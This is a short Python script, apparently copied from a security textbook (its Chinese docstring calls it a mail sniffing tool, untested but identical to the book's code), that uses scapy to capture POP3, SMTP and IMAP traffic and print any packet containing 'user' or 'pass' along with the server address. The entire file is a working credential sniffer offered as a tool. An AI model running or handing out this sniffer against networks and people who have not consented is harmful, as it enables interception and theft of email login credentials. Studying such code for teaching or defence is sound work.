"""
    邮件嗅探工具
    并未真实实验过，但与书中代码一致
"""

from scapy.all import *


def packet_callback(packet):
    if packet["TCP"].payload:
        mail_packet = str(packet["TCP"].payload)
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print("[*] Server: %s" % packet["TCP"].dst)
            print("[*] %s" % packet["TCP"].payload)


sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0)



